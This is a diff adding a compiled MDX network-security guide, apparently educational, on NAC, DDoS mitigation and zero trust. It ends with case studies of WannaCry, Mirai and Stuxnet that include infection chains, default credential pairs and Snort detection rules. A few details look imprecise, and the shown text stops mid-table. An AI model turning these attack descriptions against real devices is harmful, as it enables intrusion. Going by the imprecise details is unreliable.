+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Spoofed MAC address:"
+        }), " NAC that relies solely on MAC can be bypassed easily"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Printers/IoT:"
+        }), " Devices that do not support 802.1X need MAB (MAC Authentication Bypass)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Voice VLAN:"
+        }), " IP phones need special handling (LLDP-MED, CDP for VLAN assignment)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Guest access:"
+        }), " Captive portal bypass via MAC spoofing or OAuth token abuse"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "High availability:"
+        }), " NAC failure can block ALL network access (fail-close vs fail-open)"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-9-ddos-mitigation",
+      children: "Section 9: DDoS Mitigation"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "91-overview",
+      children: "9.1 Overview"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "A Distributed Denial of Service (DDoS) attack overwhelms a target with traffic from multiple sources, making it unavailable to legitimate users."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " A DDoS is like 10,000 people trying to enter a store with a single door simultaneously. No legitimate customer can get in."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "92-ddos-attack-types",
+      children: "9.2 DDoS Attack Types"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Layer"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Attack Type"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Mechanism"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Volume"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L3/L4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SYN Flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Incomplete TCP handshakes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~5-50 Gbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L3/L4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "UDP Amplification"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DNS/NTP/memcached amplification"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~50-500 Gbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L3/L4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ICMP Flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Ping flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~1-20 Gbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L3/L4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ACK/PSH Flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Stateful firewall exhaustion"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~10-100 Gbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP Flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Legitimate-looking HTTP requests"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~10-100k RPS"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Slowloris"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Slow HTTP headers, hold connections"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~200-1000 connections"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DNS Query Flood"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Random subdomain lookups"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~1-10M qps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "L7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "API Abuse"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Expensive endpoint calls"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~1-50k RPS"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "93-mitigation-strategies",
+      children: "9.3 Mitigation Strategies"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "1. Network-Level (volumetric):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Rate limiting with iptables\niptables -A INPUT -p tcp --dport 80 -m limit --limit 100/s --limit-burst 200 -j ACCEPT\n\n# SYN cookie protection (kernel)\nsysctl -w net.ipv4.tcp_syncookies=1\nsysctl -w net.ipv4.tcp_max_syn_backlog=4096\nsysctl -w net.core.somaxconn=4096\n\n# Drop invalid packets\niptables -A INPUT -m state --state INVALID -j DROP\n\n# Rate limit ICMP\niptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "2. Application-Level:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "# Nginx rate limiting\nhttp {\n    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;\n    \n    server {\n        location /api/ {\n            limit_req zone=api burst=50 nodelay;\n            proxy_pass http://backend;\n        }\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "3. Anycast CDN Distribution:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Instead of: 1 IP address at 1 data center\nUse: Same IP advertised from 50+ data centers worldwide (BGP anycast)\n\nAttack traffic is distributed across all locations\nEach location handles its share\nLegitimate users routed to closest available location\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "4. Cloud-based DDoS Protection (AWS Shield, Cloudflare, Akamai):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Always-on detection + on-demand mitigation:\n- L3/L4 scrubbing at cloud edge\n- L7 WAF rules to filter malicious requests\n- Behavioral analysis to distinguish humans from bots\n- Rate limiting per IP, per ASN, per country\n- Challenge (JS challenge, CAPTCHA) for suspicious traffic\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "94-ddos-mitigation-comparison-table",
+      children: "9.4 DDoS Mitigation Comparison Table"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Strategy"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Effectiveness"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Cost"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Complexity"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "False Positive Risk"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "ISP-level blackhole"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L3 only"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Very high (blocks all traffic)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "iptables rate limiting"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L3/L4 low-volume"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Reverse proxy (Nginx)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L7 moderate"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Hardware scrubber"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L3-L7 high-volume"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$$$"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Cloud DDoS protection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L3-L7 massive-scale"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$-$$$"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low (DNS change)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Very low"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Anycast distribution"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "L3-L7 distribution"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$$"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "None"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-10-zero-trust-networking-ztn",
+      children: "Section 10: Zero Trust Networking (ZTN)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "101-overview",
+      children: "10.1 Overview"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Zero Trust:"
+      }), " \"Never trust, always verify.\" No entity is trusted by default, regardless of location (inside or outside the network)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Core Principles (NIST SP 800-207):"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "All data sources and computing services are considered resources"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "All communication is secured regardless of network location"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Access to resources is granted on a per-session basis"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Access is determined by dynamic policy (identity, device health, context)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Continuous monitoring and re-evaluation"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Least privilege enforced"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " Traditional security is like a castle: thick walls, moat, single drawbridge. Once inside, everyone is trusted. Zero Trust is like a modern embassy: multiple checkpoints, identity verification at every door, no \"inside\" privilege."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "102-zero-trust-architecture-components",
+      children: "10.2 Zero Trust Architecture Components"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Component"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Function"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Example"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Policy Engine"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Makes access decisions"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OpenPolicyAgent (OPA)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Policy Administrator"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enforces decisions, issues tokens"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OAuth2/OIDC"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Policy Enforcement Point"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Executes allow/deny"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Envoy proxy, Cloudflare Tunnel"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Identity Provider"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Authenticates users/ devices"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Keycloak, Azure AD"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Device Agent"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Checks device posture"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "osquery, CrowdStrike"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Data Plane"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encrypts all traffic"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "mTLS, WireGuard"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "103-zero-trust-implementation-beyondcorp-google",
+      children: "10.3 Zero Trust Implementation: BeyondCorp (Google)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "User → Device Check → Identity Authentication → Context Evaluation → App Access\n                        ↓                          ↓\n                (OS patch, disk encrypted)    (geo, time, data sensitivity)\n\nNo VPN required:\n  - All apps are internet-accessible but invisible\n  - No internal IP ranges to protect\n  - Access based on user + device + context, not network location\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Implementation Steps:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Step 1: Identify protected resources (apps, data, APIs)\nStep 2: Map transaction flows (who needs what)\nStep 3: Deploy identity-aware proxy (Cloudflare Access, Envoy)\nStep 4: Implement device trust (MDM, osquery)\nStep 5: Define conditional access policies (user, device, context)\nStep 6: Encrypt all traffic (mTLS between services)\nStep 7: Monitor continuously (logs, anomaly detection)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "104-zero-trust-edge-cases",
+      children: "10.4 Zero Trust Edge Cases"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Legacy applications:"
+        }), " Cannot support modern auth (Kerberos/NTLM only) → need bastion/jump host"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Offline access:"
+        }), " Mobile users without connectivity need cached tokens with TTL limits"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Privileged access:"
+        }), " Admins need JIT (Just-In-Time) access with approval workflows"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Merger & acquisition:"
+        }), " Integrating another org's user base without full trust delegation"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Non-human identities:"
+        }), " Service accounts, cron jobs, Kubernetes pods → need workload identity"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-11-case-studies",
+      children: "Section 11: Case Studies"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "111-wannacry-ransomware-may-2017",
+      children: "11.1 WannaCry Ransomware (May 2017)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Impact:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "230,000+ computers across 150 countries"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Total damages: $4+ billion"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "NHS (UK National Health Service): 19,000+ appointments cancelled, 6 hospitals diverted"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical Breakdown:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Infection Chain:\n1. User receives phishing email with malicious attachment (or internal propagation)\n2. Exploit: EternalBlue (MS17-010) → SMBv1 buffer overflow\n   - Sends specially crafted SMB packet with malformed TRANS2 request\n   - Overwrites kernel memory, executes shellcode\n3. Payload: DoublePulsar backdoor installed\n4. WannaCry ransomware delivered via DoublePulsar\n5. Encryption: AES-128 per-file + RSA-2048 for key protection\n6. Ransom note: $300 → $600 in Bitcoin within 3 days\n7. Propagation: Scans LAN for SMBv1 hosts (random IP generation)\n   - Uses EternalBlue to infect each new host\n   - Each infected host becomes a propagation node\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Kill Switch:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "WannaCry checked if malwaredomain[.]com domain was registered.\nIf domain resolved → virus stopped.\nResearcher Marcus Hutchins (@MalwareTechBlog) registered domain.\nThis activated the kill switch, halting global spread.\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Lessons Learned:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Patch management is critical (MS17-010 patch released 2 months before WannaCry)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Block SMBv1 (deprecated protocol)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Network segmentation limits blast radius (NHS flat network allowed exponential spread)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Outbound internet access should be controlled for internal systems"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Snort Rule for EternalBlue:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "alert tcp $HOME_NET 445 -> $EXTERNAL_NET any\n  (msg:\"ET EXPLOIT EternalBlue SMBv1 Exploit Inbound\";\n   flow:from_server,established;\n   content:\"|ff|SMB|a0 00 00 00 00 00 00 00 00 00 00 00 00 00|\";\n   fast_pattern;\n   content:\"|00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|\";\n   distance:0; within:32;\n   reference:cve,2017-0144;\n   classtype:attempted-admin;\n   sid:1000004; rev:3;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "112-mirai-botnet-october-2016",
+      children: "11.2 Mirai Botnet (October 2016)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Impact:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "600,000+ IoT devices infected"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "KrebsOnSecurity DDoS: 620 Gbps"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "OVH DDoS: 1.1 Tbps (largest at the time)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Dyn DNS DDoS: Major internet outage (Twitter, Netflix, Reddit, GitHub down)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical Breakdown:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Infection Cycle:\n1. IoT device (DVR, camera, router) exposed on internet with default credentials\n2. Mirai scanner finds device on port 23/2323 (telnet) or 80/8080 (HTTP)\n3. Credential brute-force against 62 hardcoded username/password pairs:\n   (\"root\":\"root\", \"admin\":\"admin\", \"root\":\"xc3511\", \"support\":\"support\", ...)\n4. On successful login, downloads and executes bot binary\n5. Bot connects to CNC server, reports ready for attack\n6. Attack: SYN flood, UDP flood, HTTP flood, GRE flood, DNS water torture\n7. Propagation: Bot continuously scans /8 and /16 address ranges\n\nAttack Timeline (Krebs DDoS):\nSep 20, 2016: 620 Gbps DDoS against KrebsOnSecurity\nSeparately: 1.1 Tbps DDoS against OVH (French hosting provider)\nOct 21, 2016: Dyn DNS attack (1.2 Tbps) → major internet platforms affected\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Source Code Release:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Author \"Anna-senpai\" released source code on HackForums (Sep 30, 2016).\nReason: \"I made a lot of money, time to share.\"\nResult: Dozens of Mirai variants emerged (Satori, Okiru, Masuta).\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Detection Signature:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Snort rule for Mirai scan behavior\nalert tcp $EXTERNAL_NET any -> $HOME_NET 23\n  (msg:\"Mirai Telnet Scanning Activity\";\n   flags:S;\n   threshold:type both, track by_src, count 10, seconds 5;\n   reference:url,blog.cloudflare.com/mirai-botnet-ddos-attack;\n   classtype:attempted-recon;\n   sid:1000005; rev:2;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Lessons Learned:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "IoT devices need mandatory password change on first login"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Default credentials are a systemic vulnerability"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Telnet must be disabled on all devices"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Network-level controls: block outbound telnet (port 23)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "DDoS mitigation requires cloud-scale filtering"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "113-stuxnet-2010",
+      children: "11.3 Stuxnet (2010)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Impact:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "First known cyber weapon"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Destroyed ~1,000 IR-1 centrifuges at Natanz uranium enrichment facility, Iran"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Used 4 zero-day exploits (unprecedented)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Breached air-gapped network via USB"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical Breakdown:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Infection Chain:\nPhase 1 → Initial Infection:\n1. Stuxnet introduced via infected USB drive by social engineering\n   (or compromised supply chain → contractor laptops)\n\nPhase 2 → Propagation (internal network):\n2. Exploits MS10-061 (Print Spooler) for local privilege escalation\n3. Exploits MS08-067 (Server Service) for network propagation\n4. Uses RPC to copy itself to other systems\n5. Exploits MS10-046 (Shortcut .LNK) → auto-executes via USB icon\n\nPhase 3 → Target discovery:\n6. Looks for Siemens Step 7 software (used to program PLCs)\n7. If not found: stays dormant, continues spreading\n8. If found: extracts, decompresses, and installs rootkit components\n\nPhase 4 → PLC sabotage:\n9. Modifies PLC code via Step 7 software (using stolen Siemens certificates)\n10. Two attack profiles:\n    Attack A: Increase centrifuge rotor speed to 1,410 Hz (destructive vibration)\n    Attack B: Reduce frequency for 50 minutes, then spike to 1,410 Hz\n11. Records and replays normal sensor data (man-in-the-middle on PROFIBUS)\n12. Operators see normal readings while centrifuges self-destruct\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Zero-Day Exploits Used:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "CVE"
